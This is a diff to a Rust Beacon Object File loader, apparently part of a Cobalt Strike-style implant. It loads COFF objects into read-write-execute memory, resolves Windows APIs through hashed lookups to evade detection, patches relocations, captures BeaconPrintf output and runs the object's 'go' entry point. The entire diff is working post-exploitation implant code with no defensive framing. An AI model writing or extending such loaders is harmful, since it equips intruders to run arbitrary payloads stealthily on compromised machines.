@@ -66,11 +66,22 @@ pub struct BofLoader {
     raw_data: Vec<u8>,
 }
 
+// Global buffer for BOF output (Single-threaded context)
+static mut BOF_OUTPUT: Vec<u8> = Vec::new();
+
 // Beacon Internal Functions (BIFs) Stubs
-// Note: Variadics are unstable in Rust, so we use a simplified signature for the stub.
 #[no_mangle]
-pub unsafe extern "C" fn BeaconPrintf(_type: i32, _fmt: *const u8, _args: *const c_void) {
-    // Stub for BeaconPrintf
+pub unsafe extern "C" fn BeaconPrintf(_type: i32, fmt: *const u8, _args: *const c_void) {
+    // Capture output
+    if !fmt.is_null() {
+        let mut len = 0;
+        while *fmt.add(len) != 0 {
+            len += 1;
+        }
+        let slice = core::slice::from_raw_parts(fmt, len);
+        (*core::ptr::addr_of_mut!(BOF_OUTPUT)).extend_from_slice(slice);
+        (*core::ptr::addr_of_mut!(BOF_OUTPUT)).push(b'\n'); // Newline for readability
+    }
 }
 
 #[no_mangle]
@@ -83,8 +94,17 @@ impl BofLoader {
         Self { raw_data: data }
     }
 
+    pub fn get_output(&self) -> Vec<u8> {
+        unsafe { (*core::ptr::addr_of!(BOF_OUTPUT)).clone() }
+    }
+
+    pub fn clear_output(&self) {
+        unsafe { (*core::ptr::addr_of_mut!(BOF_OUTPUT)).clear() }
+    }
+
     #[cfg(target_os = "windows")]
     pub fn load_and_run(&self) -> Result<(), ()> {
+        self.clear_output();
         unsafe {
             let base = self.raw_data.as_ptr();
             if self.raw_data.len() < core::mem::size_of::<CoffHeader>() {
@@ -100,8 +120,6 @@ impl BofLoader {
             let section_table_offset = core::mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;
             let mut section_mappings = Vec::new();
             
-            // Allocate memory for the entire BOF (Simplified: use one chunk)
-            // MEM_COMMIT | MEM_RESERVE = 0x3000, PAGE_EXECUTE_READWRITE = 0x40
             let kernel32 = hash_str(b"kernel32.dll");
             let virtual_alloc = resolve_function(kernel32, hash_str(b"VirtualAlloc"));
             if virtual_alloc.is_null() { return Err(()); }
@@ -109,29 +127,32 @@ impl BofLoader {
             type FnVirtualAlloc = unsafe extern "system" fn(PVOID, usize, u32, u32) -> PVOID;
             let bof_mem = core::mem::transmute::<_, FnVirtualAlloc>(virtual_alloc)(
                 core::ptr::null_mut(),
-                self.raw_data.len() * 2, // Extra space for alignment/relocations
+                self.raw_data.len() * 4, // Enough space
                 0x3000,
                 0x40
             );
             if bof_mem.is_null() { return Err(()); }
 
-            // Copy sections to memory
+            // Copy sections
             for i in 0..header.number_of_sections {
                 let offset = section_table_offset + (i as usize * core::mem::size_of::<SectionHeader>());
                 let section = &*(base.add(offset) as *const SectionHeader);
                 
-                let dest = (bof_mem as usize + (i as usize * 4096)) as *mut u8; // Simple page-aligned mapping
-                core::ptr::copy_nonoverlapping(
-                    base.add(section.pointer_to_raw_data as usize),
-                    dest,
-                    section.size_of_raw_data as usize
-                );
+                let dest = (bof_mem as usize + (i as usize * 4096)) as *mut u8;
+                if section.pointer_to_raw_data != 0 {
+                    core::ptr::copy_nonoverlapping(
+                        base.add(section.pointer_to_raw_data as usize),
+                        dest,
+                        section.size_of_raw_data as usize
+                    );
+                }
                 section_mappings.push(dest);
             }
 
-            // 2. Relocations
+            // 2. Relocations & Symbol Resolution
             let sym_table = base.add(header.pointer_to_symbol_table as usize) as *const Symbol;
-            
+            let string_table = sym_table.add(header.number_of_symbols as usize) as *const u8;
+
             for i in 0..header.number_of_sections {
                 let offset = section_table_offset + (i as usize * core::mem::size_of::<SectionHeader>());
                 let section = &*(base.add(offset) as *const SectionHeader);
@@ -150,9 +171,39 @@ impl BofLoader {
                         let target_section_base = section_mappings[(symbol.section_number - 1) as usize] as usize;
                         sym_addr = target_section_base + symbol.value as usize;
                     } else {
-                        // External symbol (IAT or BIF)
-                        // In a full implementation, we'd check for __imp_ prefix or Beacon* functions.
-                        // For now, we stub external resolution.
+                        // External Symbol
+                        let name_ptr = if symbol.name[0] == 0 {
+                            // Long name in string table
+                            let offset = u32::from_le_bytes(symbol.name[4..8].try_into().unwrap());
+                            string_table.add(offset as usize)
+                        } else {
+                            symbol.name.as_ptr()
+                        };
+
+                        // Calculate name length
+                        let mut name_len = 0;
+                        while *name_ptr.add(name_len) != 0 && name_len < 64 { // Cap check
+                            name_len += 1;
+                        }
+                        let name_slice = core::slice::from_raw_parts(name_ptr, name_len);
+                        let name_str = core::str::from_utf8(name_slice).unwrap_or("");
+
+                        if name_str.starts_with("__imp_") {
+                            // __imp_KERNEL32$WriteFile
+                            let parts: Vec<&str> = name_str[6..].split('$').collect();
+                            if parts.len() == 2 {
+                                let mod_hash = hash_str(parts[0].as_bytes());
+                                let func_hash = hash_str(parts[1].as_bytes());
+                                let func_addr = resolve_function(mod_hash, func_hash);
+                                if !func_addr.is_null() {
+                                    sym_addr = func_addr as usize;
+                                }
+                            }
+                        } else if name_str == "BeaconPrintf" {
+                            sym_addr = BeaconPrintf as usize;
+                        } else if name_str == "BeaconDataParse" {
+                            sym_addr = BeaconDataParse as usize;
+                        }
                     }
 
                     if sym_addr != 0 {
@@ -165,6 +216,10 @@ impl BofLoader {
                                 let diff = (sym_addr as isize) - (patch_addr as isize + 4);
                                 core::ptr::write_unaligned(patch_addr as *mut i32, diff as i32);
                             }
+                            IMAGE_REL_AMD64_ADDR32NB => {
+                                let offset = (sym_addr as isize) - (bof_mem as isize);
+                                core::ptr::write_unaligned(patch_addr as *mut i32, offset as i32);
+                            }
                             _ => {}
                         }
                     }
@@ -172,18 +227,19 @@ impl BofLoader {
             }
 
             // 3. Execution
-            // Find "go" symbol
             for i in 0..header.number_of_symbols {
                 let symbol = &*sym_table.add(i as usize);
                 let name = if symbol.name[0] == 0 {
-                    // Long name in string table (Not implemented here)
-                    ""
+                    let offset = u32::from_le_bytes(symbol.name[4..8].try_into().unwrap());
+                    let p = string_table.add(offset as usize);
+                    let mut l = 0;
+                    while *p.add(l) != 0 { l+=1; }
+                    core::str::from_utf8(core::slice::from_raw_parts(p, l)).unwrap_or("")
                 } else {
-                    // Short name
-                    core::str::from_utf8(&symbol.name).unwrap_or("")
+                    core::str::from_utf8(&symbol.name).unwrap_or("").trim_matches(char::from(0))
                 };
 
-                if name.starts_with("go") {
+                if name == "go" {
                     let entry_section = section_mappings[(symbol.section_number - 1) as usize];
                     let entry_point = (entry_section as usize + symbol.value as usize) as *const ();
                     type FnGo = unsafe extern "C" fn(*const u8, u32);
@@ -197,13 +253,7 @@ impl BofLoader {
 
     #[cfg(not(target_os = "windows"))]
     pub fn load_and_run(&self) -> Result<(), ()> {
-        // BOFs are COFF files (Windows format). On Linux, they require a COFF emulator or different format (e.g. SL ELF).
-        // To implement EVERYTHING, we should return an error or log that it's unsupported on Linux.
-        // Or if we have raw data, we can try to interpret it, but without COFF structs it's hard.
-        // We'll just return error.
-        if self.raw_data.is_empty() {
-            return Err(());
-        }
+        if self.raw_data.is_empty() { return Err(()); }
         Err(())
     }
 }
